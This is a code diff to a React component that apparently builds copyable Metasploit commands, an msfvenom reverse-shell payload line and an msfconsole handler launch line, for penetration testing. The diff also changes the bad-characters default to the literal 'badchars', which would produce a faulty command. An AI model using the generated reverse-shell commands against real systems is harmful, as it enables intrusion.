@@ -28,10 +28,13 @@ const MSFBuilder = () => {
         Platform: 'windows',
         Arch: 'x64',
         NOP: '200',
-        BadCharacters: `00`,
+        BadCharacters: "badchars",
         Format: 'exe',
         Outfile: 'reverse_shell.exe'
     } );
+
+    const { LHOST, LPORT, Platform, Arch, NOP, Encoder,
+        EncoderIterations, BadCharacters, Format, Outfile } = values;
 
     const launchCommand = `msfconsole -qx "use exploit/multi/handler; set PAYLOAD ${ values.Payload }; set LHOST ${ values.LHOST }; set LPORT ${ values.LPORT }; run"`;
 
@@ -42,6 +45,28 @@ const MSFBuilder = () => {
     const handleChangeSelect = ( prop: string ) => ( data: any ) => {
         setValues( { ...values, [ prop ]: data } );
     };
+
+    const generateCommand = ( values ) => {
+        const options = [
+            LHOST && `LHOST=${ LHOST }`,
+            LPORT && `LPORT=${ LPORT }`,
+            Platform && `--platform ${ Platform }`,
+            Arch && `-a ${ Arch }`,
+            NOP && `-n ${ NOP }`,
+            Encoder && `-e ${ Encoder }`,
+            EncoderIterations && `-i ${ EncoderIterations }`,
+            BadCharacters && `-b "${ BadCharacters }"`,
+            Format && `-f ${ Format }`,
+            Outfile && `-o ${ Outfile }`
+        ].filter( Boolean );
+
+        if ( !values.Payload ) {
+            return '';
+        }
+
+        const command = `msfvenom -p ${ values.Payload } ${ options.join( ' ' ) }`;
+        return command;
+    }
 
     return (
         <div>
@@ -264,17 +289,7 @@ const MSFBuilder = () => {
                         <Paragraph>
                             <pre>
                                 <Text copyable>
-                                    msfvenom -p {values.Payload}
-                                    {values.LHOST > '' && ' LHOST=' + values.LHOST}
-                                    {values.LPORT > '' && ' LPORT=' + values.LPORT}
-                                    {values.Platform > '' && ' --platform ' + values.Platform}
-                                    {values.Arch > '' && ' -a ' + values.Arch}
-                                    {values.NOP > '' && ' -n ' + values.NOP}
-                                    {values.Encoder > '' && ' -e ' + values.Encoder}
-                                    {values.EncoderIterations > '' && ' -i ' + values.EncoderIterations}
-                                    {values.BadCharacters > '' && ' -b ' + `"{values.BadCharacters}"`}
-                                    {values.Format > '' && ' -f ' + values.Format}
-                                    {values.Outfile > '' && ' -o ' + values.Outfile}
+                                    {generateCommand( values )}
                                 </Text>
                             </pre>
                         </Paragraph>
